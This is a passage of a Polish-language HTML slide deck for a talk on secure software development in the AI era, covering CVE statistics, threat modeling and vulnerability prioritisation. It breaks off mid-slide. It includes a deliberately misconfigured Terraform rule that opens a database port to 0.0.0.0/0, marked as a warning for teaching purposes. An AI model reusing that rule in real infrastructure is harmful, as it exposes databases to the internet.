@@ -1,0 +1,625 @@
+<!doctype html>
+<html lang="pl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=1024">
+<title>Jak nie zwariować z podatnościami w erze AI</title>
+<link rel="stylesheet" href="css/deck.css">
+</head>
+<body class="impress-not-supported">
+
+<!-- "Jesteś tutaj": stały pasek SDLC -->
+<nav id="sdlc-bar" aria-label="Etap SDLC">
+  <div class="seg" data-stage="projekt">Projekt</div>
+  <div class="seg" data-stage="kod">Kod + zależności</div>
+  <div class="seg" data-stage="cicd">CI/CD</div>
+  <div class="seg" data-stage="runtime">Runtime</div>
+  <div class="seg" data-stage="laptop">Laptop</div>
+</nav>
+
+<!-- numer kroku (aktualizowany w deck.js) -->
+<div id="slide-num" aria-hidden="true"></div>
+
+<div id="impress"
+     data-width="1920" data-height="1080"
+     data-max-scale="3" data-min-scale="0"
+     data-perspective="1000"
+     data-transition-duration="1300">
+
+<!-- ================= DEKORACJE PŁÓTNA (nie są krokami) ================= -->
+
+<!-- tytuły klastrów prologu -->
+<div class="deco cluster-title" data-x="1150"  data-y="-12450">Wstęp</div>
+<div class="deco cluster-title" data-x="10900" data-y="-12450">State of AppSec</div>
+<div class="deco cluster-title" data-x="19575" data-y="-12450">Krok wstecz</div>
+
+<!-- dzielnice SDLC -->
+<div class="deco district laptop-band" data-stage="laptop" data-x="9000" data-y="4450" data-z="-20" style="width:23400px;height:1750px"></div>
+<div class="deco district" data-stage="projekt" data-x="0"     data-y="0" data-z="-20"></div>
+<div class="deco district" data-stage="kod"     data-x="6000"  data-y="0" data-z="-20"></div>
+<div class="deco district" data-stage="cicd"    data-x="12000" data-y="0" data-z="-20"></div>
+<div class="deco district" data-stage="runtime" data-x="18000" data-y="0" data-z="-20"></div>
+
+<div class="deco district-title" data-stage="laptop"  data-x="1150" data-y="4450" style="width:4200px">Laptop<small>dewelopera + agent AI</small></div>
+<div class="deco district-title" data-stage="projekt" data-x="0"     data-y="-2150">Projekt</div>
+<div class="deco district-title" data-stage="kod"     data-x="6000"  data-y="-2150">Kod + zależności</div>
+<div class="deco district-title" data-stage="cicd"    data-x="12000" data-y="-2150">CI/CD</div>
+<div class="deco district-title" data-stage="runtime" data-x="18000" data-y="-2150">Runtime</div>
+
+<div class="deco district-caption" data-stage="laptop"  data-x="16800" data-y="4450" style="width:5400px">sekrety w <code>.env</code>, agent z shellem,<br>stałe dostępy admina</div>
+<div class="deco district-caption" data-stage="projekt" data-x="0"     data-y="2250">dziurawa autoryzacja,<br>brak modelu zagrożeń</div>
+<div class="deco district-caption" data-stage="kod"     data-x="6000"  data-y="2250">CVE w bibliotekach, błędy w kodzie,<br>misconfig w IaC</div>
+<div class="deco district-caption" data-stage="cicd"    data-x="12000" data-y="2250">pipeline z kluczami<br>do królestwa</div>
+<div class="deco district-caption" data-stage="runtime" data-x="18000" data-y="2250">uprawnienia, ekspozycja,<br>dryf konfiguracji</div>
+
+<!-- taśmociąg SDLC: zmiany jadą od lewej do prod; duszki = gdzie wchodzi atak, kamerki = kontrole -->
+<div class="deco belt" data-x="8550" data-y="-150" data-z="-12" style="width:24300px"><div class="belt-figs"><i class="fig f0"></i><i class="fig f1"></i><i class="fig f2"></i><i class="fig f3"></i><i class="fig f0"></i><i class="fig f1"></i><i class="fig f2"></i><i class="fig f3"></i><i class="fig f0"></i><i class="fig f1"></i><i class="fig f2"></i><i class="fig f3"></i><i class="fig f0"></i><i class="fig f1"></i><i class="fig f2"></i><i class="fig f3"></i><i class="fig f0"></i><i class="fig f1"></i><i class="fig f2"></i><i class="fig f3"></i><i class="fig f0"></i><i class="fig f1"></i><i class="fig f2"></i><i class="fig f3"></i><i class="fig f0"></i><i class="fig f1"></i><i class="fig f2"></i><i class="fig f3"></i><i class="fig f0"></i><i class="fig f1"></i><i class="fig f2"></i><i class="fig f3"></i><i class="fig f0"></i><i class="fig f1"></i><i class="fig f2"></i><i class="fig f3"></i><i class="fig f0"></i><i class="fig f1"></i><i class="fig f2"></i><i class="fig f3"></i><i class="fig f0"></i><i class="fig f1"></i><i class="fig f2"></i><i class="fig f3"></i><i class="fig f0"></i><i class="fig f1"></i><i class="fig f2"></i><i class="fig f3"></i><i class="fig f0"></i><i class="fig f1"></i><i class="fig f2"></i><i class="fig f3"></i><i class="fig f0"></i><i class="fig f1"></i><i class="fig f2"></i><i class="fig f3"></i><i class="fig f0"></i><i class="fig f1"></i><i class="fig f2"></i><i class="fig f3"></i></div><div class="belt-line"></div></div>
+<div class="deco belt-pin" data-x="20950" data-y="-400" data-z="-11"><svg viewBox="0 0 380 560" width="380" height="560"><path d="M190 0C85 0 0 85 0 190C0 330 190 560 190 560S380 330 380 190C380 85 295 0 190 0Z" fill="#34a853"/><circle cx="190" cy="190" r="92" fill="#fff"/><circle cx="190" cy="190" r="58" fill="#34a853"/></svg><div class="pin-label">prod</div></div>
+<!-- twist: laptop pod całym SDLC, strzałki do każdego etapu (widoczne od S27) -->
+<div class="deco laptop-link" data-stage="laptop" data-x="0" data-y="2600" data-z="-12"><svg viewBox="0 0 360 1950" width="360" height="1950"><path d="M180 1950V230" stroke="#d23b3b" stroke-width="70"/><path d="M10 300L180 0L350 300Z" fill="#d23b3b"/></svg></div>
+<div class="deco laptop-link-label" data-stage="laptop" data-x="260" data-y="2700" data-z="-12">dokumenty, model zagrożeń</div>
+<div class="deco laptop-link" data-stage="laptop" data-x="6000" data-y="2600" data-z="-12"><svg viewBox="0 0 360 1950" width="360" height="1950"><path d="M180 1950V230" stroke="#d23b3b" stroke-width="70"/><path d="M10 300L180 0L350 300Z" fill="#d23b3b"/></svg></div>
+<div class="deco laptop-link-label" data-stage="laptop" data-x="6260" data-y="2700" data-z="-12">repo, zależności</div>
+<div class="deco laptop-link" data-stage="laptop" data-x="12000" data-y="2600" data-z="-12"><svg viewBox="0 0 360 1950" width="360" height="1950"><path d="M180 1950V230" stroke="#d23b3b" stroke-width="70"/><path d="M10 300L180 0L350 300Z" fill="#d23b3b"/></svg></div>
+<div class="deco laptop-link-label" data-stage="laptop" data-x="12260" data-y="2700" data-z="-12">admin repo GH</div>
+<div class="deco laptop-link" data-stage="laptop" data-x="18000" data-y="2600" data-z="-12"><svg viewBox="0 0 360 1950" width="360" height="1950"><path d="M180 1950V230" stroke="#d23b3b" stroke-width="70"/><path d="M10 300L180 0L350 300Z" fill="#d23b3b"/></svg></div>
+<div class="deco laptop-link-label" data-stage="laptop" data-x="18260" data-y="2700" data-z="-12">klucze do chmury, kubectl</div>
+<!-- stacje: przed każdą dzielnicą -->
+<div class="deco belt-ghost " data-stage="projekt" data-x="-2900" data-y="-320" data-z="-11"><svg viewBox="0 0 420 640" width="420" height="640"><path d="M210 0C96 0 20 86 20 200V640L90 585L160 640L210 590L260 640L330 585L400 640V200C400 86 324 0 210 0Z" fill="#202124"/><path d="M118 226L178 246L172 262L114 244Z" fill="#ea4335"/><path d="M302 226L242 246L248 262L306 244Z" fill="#ea4335"/></svg></div>
+<div class="deco belt-camera" data-stage="projekt" data-x="-2480" data-y="-1050" data-z="-11"><svg viewBox="0 0 760 520" width="760" height="520"><rect x="640" y="20" width="60" height="240" rx="14" fill="#676c72"/><path d="M670 140L520 230" stroke="#676c72" stroke-width="44" stroke-linecap="round"/><circle cx="520" cy="230" r="44" fill="#676c72"/><circle cx="520" cy="230" r="18" fill="#959ca5"/><g transform="rotate(-28 400 220)"><rect x="40" y="120" width="460" height="170" rx="26" fill="#959ca5"/><rect x="40" y="250" width="460" height="40" rx="14" fill="#676c72"/><rect x="0" y="140" width="80" height="130" rx="18" fill="#444"/><g fill="#676c72"><rect x="380" y="160" width="80" height="12" rx="6"/><rect x="380" y="185" width="80" height="12" rx="6"/><rect x="380" y="210" width="80" height="12" rx="6"/></g></g></svg></div>
+<div class="deco belt-ghost " data-stage="kod" data-x="2580" data-y="-320" data-z="-11"><svg viewBox="0 0 420 640" width="420" height="640"><path d="M210 0C96 0 20 86 20 200V640L90 585L160 640L210 590L260 640L330 585L400 640V200C400 86 324 0 210 0Z" fill="#202124"/><path d="M118 226L178 246L172 262L114 244Z" fill="#ea4335"/><path d="M302 226L242 246L248 262L306 244Z" fill="#ea4335"/></svg></div>
+<div class="deco belt-camera" data-stage="kod" data-x="3380" data-y="-1050" data-z="-11"><svg viewBox="0 0 760 520" width="760" height="520"><rect x="640" y="20" width="60" height="240" rx="14" fill="#676c72"/><path d="M670 140L520 230" stroke="#676c72" stroke-width="44" stroke-linecap="round"/><circle cx="520" cy="230" r="44" fill="#676c72"/><circle cx="520" cy="230" r="18" fill="#959ca5"/><g transform="rotate(-28 400 220)"><rect x="40" y="120" width="460" height="170" rx="26" fill="#959ca5"/><rect x="40" y="250" width="460" height="40" rx="14" fill="#676c72"/><rect x="0" y="140" width="80" height="130" rx="18" fill="#444"/><g fill="#676c72"><rect x="380" y="160" width="80" height="12" rx="6"/><rect x="380" y="185" width="80" height="12" rx="6"/><rect x="380" y="210" width="80" height="12" rx="6"/></g></g></svg></div>
+<div class="deco belt-ghost " data-stage="cicd" data-x="8580" data-y="-320" data-z="-11"><svg viewBox="0 0 420 640" width="420" height="640"><path d="M210 0C96 0 20 86 20 200V640L90 585L160 640L210 590L260 640L330 585L400 640V200C400 86 324 0 210 0Z" fill="#202124"/><path d="M118 226L178 246L172 262L114 244Z" fill="#ea4335"/><path d="M302 226L242 246L248 262L306 244Z" fill="#ea4335"/></svg></div>
+<div class="deco belt-camera" data-stage="cicd" data-x="9380" data-y="-1050" data-z="-11"><svg viewBox="0 0 760 520" width="760" height="520"><rect x="640" y="20" width="60" height="240" rx="14" fill="#676c72"/><path d="M670 140L520 230" stroke="#676c72" stroke-width="44" stroke-linecap="round"/><circle cx="520" cy="230" r="44" fill="#676c72"/><circle cx="520" cy="230" r="18" fill="#959ca5"/><g transform="rotate(-28 400 220)"><rect x="40" y="120" width="460" height="170" rx="26" fill="#959ca5"/><rect x="40" y="250" width="460" height="40" rx="14" fill="#676c72"/><rect x="0" y="140" width="80" height="130" rx="18" fill="#444"/><g fill="#676c72"><rect x="380" y="160" width="80" height="12" rx="6"/><rect x="380" y="185" width="80" height="12" rx="6"/><rect x="380" y="210" width="80" height="12" rx="6"/></g></g></svg></div>
+<div class="deco belt-ghost " data-stage="runtime" data-x="14580" data-y="-320" data-z="-11"><svg viewBox="0 0 420 640" width="420" height="640"><path d="M210 0C96 0 20 86 20 200V640L90 585L160 640L210 590L260 640L330 585L400 640V200C400 86 324 0 210 0Z" fill="#202124"/><path d="M118 226L178 246L172 262L114 244Z" fill="#ea4335"/><path d="M302 226L242 246L248 262L306 244Z" fill="#ea4335"/></svg></div>
+<div class="deco belt-camera" data-stage="runtime" data-x="15380" data-y="-1050" data-z="-11"><svg viewBox="0 0 760 520" width="760" height="520"><rect x="640" y="20" width="60" height="240" rx="14" fill="#676c72"/><path d="M670 140L520 230" stroke="#676c72" stroke-width="44" stroke-linecap="round"/><circle cx="520" cy="230" r="44" fill="#676c72"/><circle cx="520" cy="230" r="18" fill="#959ca5"/><g transform="rotate(-28 400 220)"><rect x="40" y="120" width="460" height="170" rx="26" fill="#959ca5"/><rect x="40" y="250" width="460" height="40" rx="14" fill="#676c72"/><rect x="0" y="140" width="80" height="130" rx="18" fill="#444"/><g fill="#676c72"><rect x="380" y="160" width="80" height="12" rx="6"/><rect x="380" y="185" width="80" height="12" rx="6"/><rect x="380" y="210" width="80" height="12" rx="6"/></g></g></svg></div>
+<div class="deco belt-ghost laptop-only" data-stage="laptop" data-x="4400" data-y="4450" data-z="-11"><svg viewBox="0 0 420 640" width="420" height="640"><path d="M210 0C96 0 20 86 20 200V640L90 585L160 640L210 590L260 640L330 585L400 640V200C400 86 324 0 210 0Z" fill="#202124"/><path d="M118 226L178 246L172 262L114 244Z" fill="#ea4335"/><path d="M302 226L242 246L248 262L306 244Z" fill="#ea4335"/></svg></div>
+
+<!-- ================= 1. WSTĘP ================= -->
+
+<div id="s01" class="step slide" data-stage="prologue" data-x="-1000" data-y="-11500">
+  <div class="center-stage">
+    <div class="kicker" style="color:var(--kod)">Łódź JUG · 24.11.2026</div>
+    <h1>Jak nie zwariować<br>z podatnościami w erze AI</h1>
+    <p style="font-size:56px;margin-top:30px" class="muted">Secure SDLC w praktyce</p>
+    <div class="title-speaker">
+      <img class="avatar lg" src="img/ciesielski.jpg" alt="">
+      <p><b>Krzysztof Ciesielski</b><br><span class="muted">SoftwareMill / VirtusLab</span></p>
+      <img class="company-logo" src="img/softwaremill.svg" alt="SoftwareMill">
+    </div>
+    <div class="title-axis">
+      <span style="background:var(--projekt)"></span>
+      <span style="background:var(--kod)"></span>
+      <span style="background:var(--cicd)"></span>
+      <span style="background:var(--runtime)"></span>
+    </div>
+  </div>
+</div>
+
+<div id="s02" class="step slide roomy" data-stage="prologue" data-x="1150" data-y="-11500">
+  <div class="kicker">O mnie</div>
+  <h2>Krzysztof Ciesielski</h2>
+  <ul class="clean">
+    <li>Developer → architekt → <b>AppSec / DevSecOps</b></li>
+    <li>Kilkanaście lat w ekosystemie <b>JVM</b></li>
+    <li>SoftwareMill / VirtusLab: Secure SDLC wewnętrznie i u klientów</li>
+    <li>Automatyzacje wykrywania zagrożeń, CI/CD, chmura</li>
+  </ul>
+</div>
+
+<div id="s03" class="step slide" data-stage="prologue" data-x="3300" data-y="-11500">
+  <div class="kicker">O czym będzie</div>
+  <h2>Przejdziemy drogę zmiany od pomysłu do produkcji</h2>
+  <div class="title-axis" style="display:flex;gap:16px;margin:30px 0 50px">
+    <div class="box tint" data-stage="projekt" style="flex:1;text-align:center;font-weight:800;color:var(--c)">Projekt</div>
+    <div class="box tint" data-stage="kod" style="flex:1;text-align:center;font-weight:800;color:var(--c)">Kod + zależności</div>
+    <div class="box tint" data-stage="cicd" style="flex:1;text-align:center;font-weight:800;color:var(--c)">CI/CD</div>
+    <div class="box tint" data-stage="runtime" style="flex:1;text-align:center;font-weight:800;color:var(--c)">Runtime</div>
+  </div>
+  <p style="font-size:52px">Na każdym etapie jedno pytanie:<br><b>co robią narzędzia i AI, a co musi zostać przy człowieku?</b></p>
+</div>
+
+<!-- ================= 2. STATE OF APPSEC ================= -->
+
+<div id="s04" class="step slide" data-stage="prologue" data-x="6600" data-y="-11500">
+  <div class="kicker">State of AppSec</div>
+  <div class="cols-3-2">
+    <svg viewBox="0 0 1100 700" width="1000" aria-label="Liczba CVE rocznie">
+      <line x1="60" y1="600" x2="1080" y2="600" stroke="#c9ced8" stroke-width="4"/>
+      <rect x="110" y="380" width="240" height="220" rx="14" fill="#c9ced8"/>
+      <rect x="430" y="336" width="240" height="264" rx="14" fill="#9aa2b1"/>
+      <rect x="750" y="105" width="240" height="495" rx="14" fill="#d23b3b"/>
+      <text x="230" y="360" text-anchor="middle" font-size="54" font-weight="800" fill="#1b2130">~40k</text>
+      <text x="550" y="316" text-anchor="middle" font-size="54" font-weight="800" fill="#1b2130">~48k</text>
+      <text x="870" y="85"  text-anchor="middle" font-size="64" font-weight="850" fill="#d23b3b">~90k</text>
+      <text x="230" y="660" text-anchor="middle" font-size="42" fill="#5b6475">2024</text>
+      <text x="550" y="660" text-anchor="middle" font-size="42" fill="#5b6475">2025</text>
+      <text x="870" y="660" text-anchor="middle" font-size="42" font-weight="700" fill="#1b2130">2026 (I–X)</text>
+      <text x="870" y="155" text-anchor="middle" font-size="30" font-weight="700" fill="white">+ 2 miesiące</text>
+    </svg>
+    <div>
+      <div class="quote" style="font-size:60px">„Kolejka rośnie szybciej niż maleje.”</div>
+      <div class="quote-by with-photo"><img class="avatar" src="img/dyjak.jpg" alt=""><span>Andrzej Dyjak<br>Bezpieczny Kod</span></div>
+    </div>
+  </div>
+  <div class="source">CVE rocznie · źródło: NVD via J. Gamblin, monthlyCVEStats</div>
+</div>
+
+<div id="s05" class="step slide" data-stage="prologue" data-x="8750" data-y="-11500">
+  <div class="kicker">State of AppSec</div>
+  <h2>…globalnie i u was</h2>
+  <div class="cols">
+    <div class="box">
+      <h3>Globalnie: NVD (NIST)</h3>
+      <p class="small">NVD nie nadąża z analizą CVE. W IV 2026 <b>~29 tys.</b> zaległych CVE dostało status „Not&nbsp;Scheduled”, czyli <b>bez terminu analizy</b>.</p>
+      <p class="xs muted">Pierwszeństwo mają tylko podatności aktywnie wykorzystywane (KEV) i software rządowy.</p>
+    </div>
+    <div class="box">
+      <h3>U was: Veracode SoSS 2026</h3>
+      <p><b>82%</b> firm ma security debt, <b>60%</b> krytyczny.</p>
+      <p>Mediana: <b>~10% backlogu</b> naprawiane miesięcznie.</p>
+    </div>
+  </div>
+  <div class="punch">Nawet NIST musiał zacząć priorytetyzować.</div>
+</div>
+
+<div id="s06" class="step slide" data-stage="prologue" data-x="10900" data-y="-11500">
+  <div class="kicker">State of AppSec</div>
+  <h2>Szukanie stało się tanie. Naprawa nie.</h2>
+  <div class="cols">
+    <div class="box">
+      <h3>Szukanie podatności staniało</h3>
+      <ul class="clean small tight" style="--c:var(--kod)">
+        <li>Claude Opus 4.6: <b>500+</b> podatności high w OSS<span class="sub">każda zweryfikowana przez człowieka</span></li>
+        <li>AISLE: <b>12 z 12</b> zero-dayów OpenSSL<span class="sub">wszystkie ze styczniowego wydania 2026 zgłosił AISLE</span></li>
+        <li>XBOW: <b>nr 1</b> na HackerOne (USA, VI 2025)<span class="sub">ranking ludzkich bug bounty hunterów</span></li>
+      </ul>
+    </div>
+    <div class="box substep">
+      <h3>Naprawa</h3>
+      <ul class="clean small" style="--c:var(--alert)">
+        <li>curl zamyka bug bounty: <b>8×</b> więcej zgłoszeń w tydzień, głównie AI slop</li>
+        <li>Nadal człowiek: zrozumieć, zmienić, przetestować, wdrożyć</li>
+      </ul>
+    </div>
+  </div>
+  <div class="punch substep" style="--c:var(--alert)">Atakujący użyje najlepszego dostępnego modelu.</div>
+</div>
+
+<div id="s07" class="step slide" data-stage="prologue" data-x="13050" data-y="-11500">
+  <div class="kicker">State of AppSec</div>
+  <h2>Kierunek stały. Rośnie tylko tempo.</h2>
+  <svg viewBox="0 0 1660 600" width="1660" aria-label="Time to exploit">
+    <line x1="80" y1="440" x2="1620" y2="440" stroke="#1b2130" stroke-width="4" stroke-dasharray="14 10"/>
+    <text x="80" y="425" text-anchor="start" font-size="30" fill="#5b6475">dzień publikacji patcha</text>
+    <polyline points="200,80 600,257 1000,411 1400,480" fill="none" stroke="#9aa2b1" stroke-width="10" stroke-linejoin="round"/>
+    <circle cx="200" cy="80" r="20" fill="#9aa2b1"/>
+    <circle cx="600" cy="257" r="20" fill="#9aa2b1"/>
+    <circle cx="1000" cy="411" r="20" fill="#9aa2b1"/>
+    <circle cx="1400" cy="480" r="28" fill="#d23b3b"/>
+    <text x="200" y="55" text-anchor="middle" font-size="58" font-weight="850" fill="#1b2130">63 dni</text>
+    <text x="600" y="232" text-anchor="middle" font-size="58" font-weight="850" fill="#1b2130">32</text>
+    <text x="1000" y="380" text-anchor="middle" font-size="58" font-weight="850" fill="#1b2130">5</text>
+    <text x="1450" y="510" text-anchor="start" font-size="84" font-weight="900" fill="#d23b3b">−7</text>
+    <text x="200" y="590" text-anchor="middle" font-size="36" fill="#5b6475">2018–19</text>
+    <text x="600" y="590" text-anchor="middle" font-size="36" fill="#5b6475">2021–22</text>
+    <text x="1000" y="590" text-anchor="middle" font-size="36" fill="#5b6475">2023</text>
+    <text x="1400" y="590" text-anchor="middle" font-size="36" font-weight="700" fill="#d23b3b">2025</text>
+  </svg>
+  <div class="source">Średni time to exploit · źródło: Mandiant M-Trends (2026: dane za 2025)</div>
+</div>
+
+<div id="s08" class="step slide roomy" data-stage="prologue" data-x="15200" data-y="-11500">
+  <div class="kicker">Trivia</div>
+  <h2>Oni wiedzą, dokąd to zmierza</h2>
+  <div class="people">
+    <div class="box"><div class="who">Ben Hawkes</div><div class="was">ex-lead Google Project Zero</div><div class="now">→ Anthropic</div></div>
+    <div class="box"><div class="who">Halvar Flake</div><div class="was">Thomas Dullien, legenda RE</div><div class="now">→ OpenAI</div></div>
+    <div class="box"><div class="who">lcamtuf</div><div class="was">Michał Zalewski, autor AFL</div><div class="now">→ firma AI</div></div>
+  </div>
+</div>
+
+<!-- ================= 3. KROK WSTECZ ================= -->
+
+<div id="s09" class="step slide" data-stage="prologue" data-x="18500" data-y="-11500">
+  <div class="kicker">Krok wstecz</div>
+  <h2>Naprawiać szybciej? Musimy.<br>Ale jak mieć <span class="accent" style="--c:var(--kod)">mniej</span> do naprawiania?</h2>
+  <div class="quote" style="font-size:54px">„Każdy problem bezpieczeństwa jest problemem jakości. Ale nie każdy problem jakości jest problemem bezpieczeństwa.”</div>
+  <div class="quote-by with-photo"><img class="avatar" src="img/vandergaast.jpg" alt=""><span>Greg van der Gaast</span></div>
+  <p style="margin-top:50px">Zamiast „jak to załatać?” pytaj <b>„dlaczego to było exploitowalne?”</b></p>
+</div>
+
+<div id="s10" class="step slide" data-stage="prologue" data-x="20650" data-y="-11500">
+  <div class="kicker">Krok wstecz</div>
+  <div style="display:flex;align-items:center;gap:40px;margin:20px 0 70px">
+    <div class="box" style="flex:1;text-align:center"><b style="font-size:56px">Dev + Ops → DevOps</b><div class="small muted" style="margin-top:12px">observability · architektura · IaC</div></div>
+    <div style="font-size:90px;color:var(--faint)">→</div>
+    <div class="box tint" data-stage="kod" style="flex:1;text-align:center"><b style="font-size:56px">Dev + <span class="alert">Sec</span> + Ops</b><div class="small muted" style="margin-top:12px">security jako część rzemiosła</div></div>
+  </div>
+  <div class="quote">„Security is not a department, it's a culture.”</div>
+  <div class="quote-by with-photo"><img class="avatar" src="img/jackson.jpg" alt=""><span>Mackenzie Jackson, Field CTO, Aikido</span></div>
+</div>
+
+<!-- S11: MAPA (zoom out) -->
+<div id="s11" class="step map" data-mode="map" data-stage="map"
+     data-x="9000" data-y="0" data-scale="12.8" data-transition-duration="2000">
+  <div class="hud">Na każdym etapie: co robią narzędzia i AI, a co zostaje przy człowieku?</div>
+</div>
+
+<!-- ================= 4. PROJEKT ================= -->
+
+<div id="s13" class="step slide roomy" data-stage="projekt" data-x="-1075" data-y="-625">
+  <div class="kicker">Projekt · threat modeling</div>
+  <h2>Cztery pytania</h2>
+  <ol class="four-q">
+    <li>Co budujemy?</li>
+    <li>Co może pójść nie tak?</li>
+    <li>Co z tym zrobimy?</li>
+    <li>Czy zrobiliśmy to dobrze?</li>
+  </ol>
+  <p class="small muted" style="margin-top:30px">AI może tu podpowiadać, ale wartością nie jest diagram, tylko <b style="color:var(--ink)">zrozumienie</b> w głowach zespołu.</p>
+</div>
+
+<div id="s14" class="step slide" data-stage="projekt" data-x="1075" data-y="-625">
+  <div class="kicker">Projekt · rola seniora</div>
+  <h2 style="margin-bottom:24px">Dziura nie w kodzie, tylko w&nbsp;założeniu projektowym</h2>
+  <p style="font-size:46px;font-weight:750;margin-bottom:34px">Storm-0558: klucz do kont <span class="accent">konsumenckich</span> podpisywał tokeny, które otwierały skrzynki <span class="accent">firmowe</span>.</p>
+  <div class="quote" style="font-size:38px;margin-bottom:20px">„Kultura bezpieczeństwa Microsoftu była nieadekwatna i wymaga przebudowy.”</div>
+  <div class="quote-by with-photo"><img class="avatar logo" src="img/csrb.png" alt=""><span>Cyber Safety Review Board (DHS), 2024</span></div>
+  <p class="xs muted" style="margin-top:22px">500+ skrzynek w 22 organizacjach, w tym w rządzie USA. Wykrył to klient, nie Microsoft.</p>
+  <div class="punch">Za decyzje projektowe odpowiada człowiek. Tej odpowiedzialności nie oddasz AI.</div>
+</div>
+
+<div id="s15" class="step slide" data-stage="projekt" data-x="0" data-y="625">
+  <div class="kicker">Projekt · gdzie zacząć</div>
+  <div class="cols" style="gap:60px;align-items:start">
+    <div>
+      <h3>Dobre rady</h3>
+      <ol class="four-q tips">
+        <li><span>Modeluj zagrożenia</span></li>
+        <li><span>Dokumentuj model zagrożeń i decyzje bezpieczeństwa w&nbsp;markdown, w repo<span class="sub">bonus: agent AI też to przeczyta</span></span></li>
+        <li><span>Zmiana granicy zaufania = przegląd modelu w PR<span class="sub">nowy endpoint, integracja, uprawnienie</span></span></li>
+      </ol>
+    </div>
+    <div class="box tint">
+      <div class="quote-by with-photo" style="padding-left:0;margin-bottom:22px"><img class="avatar" src="img/dyjak.jpg" alt=""><span><b style="color:var(--ink)">Bezpieczny Kod</b><br>blog o threat modelingu</span></div>
+      <ul class="clean small">
+        <li>Modelowanie zagrożeń: kompletny przewodnik</li>
+        <li>Sesja modelowania zagrożeń krok po kroku</li>
+        <li>Czym jest STRIDE<span class="sub">to NIE metodyka, tylko lista kategorii zagrożeń (Spoofing, Tampering, Repudiation, Information disclosure, DoS, Elevation of privilege). Pomaga odpowiedzieć na „co może pójść nie tak?”</span></li>
+      </ul>
+      <p class="mono accent" style="font-size:40px;margin:10px 0 0">bezpiecznykod.pl/blog</p>
+    </div>
+  </div>
+</div>
+
+<!-- MAPA: przejście do Kodu -->
+<div id="m-kod" class="step map" data-mode="map" data-stage="map" data-highlight="kod"
+     data-x="9000" data-y="0" data-scale="12.8" data-transition-duration="1600">
+  <div class="hud">Etap 2: <span style="color:var(--kod)">kod i zależności</span></div>
+</div>
+
+<!-- ================= 5. KOD I ZALEŻNOŚCI ================= -->
+
+<div id="s16" class="step slide" data-stage="kod" data-x="4925" data-y="-625">
+  <div class="center-stage">
+    <p style="font-size:88px;font-weight:800;line-height:1.2;letter-spacing:-.02em">Ilu z was łatało <span class="accent">Log4Shell</span> w serwisie, który w ogóle nie logował danych od użytkownika?</p>
+  </div>
+</div>
+
+<!-- S16b: humorystyczna wrzutka (karteczka na środku dzielnicy Kod) -->
+<div id="s16b" class="step slide shell-note" data-stage="kod" data-x="6000" data-y="0" data-z="40" data-scale="0.55" data-rotate="-3">
+  <div class="kicker">Kod + zależności · ostatnie tygodnie</div>
+  <div class="shells">
+    <span>PHP2Shell <small>21 X</small></span>
+    <span>Node2Shell <small>21 X</small></span>
+    <span>4EverAble2Shell <small>XI</small></span>
+    <span class="jvm">Java4Shell <small>17 XI · OpenJDK!</small></span>
+    <span>NGINX2Shell <small>18 XI</small></span>
+    <span>Ruby2Shell <small>18 XI</small></span>
+    <span>phpAfterShell <small>19 XI</small></span>
+  </div>
+  <p class="go2sleep">…a kiedy <b>go2sleep</b>?</p>
+</div>
+
+<div id="s17" class="step slide" data-stage="kod" data-x="7075" data-y="-625">
+  <div class="kicker">Kod + zależności · TOOLINGMAXXING</div>
+  <h2>Z 376 tysięcy do garstki</h2>
+  <div class="cols-3-2" style="align-items:start">
+    <div class="funnel">
+      <div style="width:100%;background:#9aa2b1">Wszystkie CVE: <b>~376 tys.</b></div>
+      <div style="width:82%;background:#7d879a">Wykorzystywane w praktyce (KEV): <b>~1,7 tys.</b></div>
+      <div style="width:64%;background:#4f78c4">Osiągalne z twojego kodu?</div>
+      <div style="width:48%;background:#2a6bd8">Na produkcji i wystawione?</div>
+      <div style="width:34%;background:#d23b3b">To naprawiasz dziś</div>
+    </div>
+    <div>
+      <div class="big-number">18%</div>
+      <p class="small">krytycznych CVE zostaje krytycznych po dodaniu kontekstu runtime</p>
+      <p class="xs muted">Datadog, State of DevSecOps</p>
+    </div>
+  </div>
+  <div style="margin-top:34px">
+    <span class="pill">KEV</span><span class="pill">EPSS</span><span class="pill">reachability</span><span class="pill">ekspozycja</span><span class="pill" style="background:#eee;color:#9aa2b1;text-decoration:line-through">sam CVSS</span>
+  </div>
+</div>
+
+<div id="s18" class="step slide" data-stage="kod" data-x="4925" data-y="625">
+  <div class="kicker">Kod + zależności · IaC · TOOLINGMAXXING</div>
+  <h2>IaC to też kod</h2>
+<pre class="code"><span class="k">resource</span> <span class="s">"aws_security_group_rule"</span> <span class="s">"db"</span> {
+  type        = <span class="s">"ingress"</span>
+  from_port   = <span class="n">5432</span>
+  <span class="hl">cidr_blocks = [<span class="s">"0.0.0.0/0"</span>]</span>   <span class="c"># ⚠ publicznie dostępne</span>
+}</pre>
+  <p>Te same skanery, ten sam etap (PR / pre-commit).<br>To, co <b class="accent">zamierzałeś</b> wdrożyć.</p>
+</div>
+
+<div id="s19" class="step slide" data-stage="kod" data-x="7075" data-y="625">
+  <div class="kicker">Kod + zależności · AI jako autor · TOOLINGMAXXING</div>
+  <h2>AI pisze kod, AI sprawdza kod</h2>
+  <svg viewBox="0 0 1660 420" width="1660" aria-label="Skaner w pętli agenta">
+    <defs>
+      <marker id="ar" markerUnits="userSpaceOnUse" markerWidth="30" markerHeight="30" refX="24" refY="15" orient="auto"><path d="M0,0 L30,15 L0,30 z" fill="#5b6475"/></marker>
+      <marker id="ar-red" markerUnits="userSpaceOnUse" markerWidth="30" markerHeight="30" refX="24" refY="15" orient="auto"><path d="M0,0 L30,15 L0,30 z" fill="#d23b3b"/></marker>
+    </defs>
+    <rect x="20" y="130" width="380" height="150" rx="24" fill="#eef3fc" stroke="#2a6bd8" stroke-width="5"/>
+    <text x="210" y="220" text-anchor="middle" font-size="40" font-weight="750" fill="#1b2130">Agent pisze kod</text>
+    <rect x="560" y="130" width="420" height="150" rx="24" fill="#fdf0f0" stroke="#d23b3b" stroke-width="5"/>
+    <text x="770" y="200" text-anchor="middle" font-size="40" font-weight="750" fill="#1b2130">Skaner</text>
+    <text x="770" y="248" text-anchor="middle" font-size="30" fill="#5b6475">MCP / hook</text>
+    <rect x="1140" y="130" width="300" height="150" rx="24" fill="#e9f6ef" stroke="#23966a" stroke-width="5"/>
+    <text x="1290" y="220" text-anchor="middle" font-size="44" font-weight="800" fill="#1b2130">PR ✓</text>
+    <line x1="400" y1="205" x2="550" y2="205" stroke="#5b6475" stroke-width="6" marker-end="url(#ar)"/>
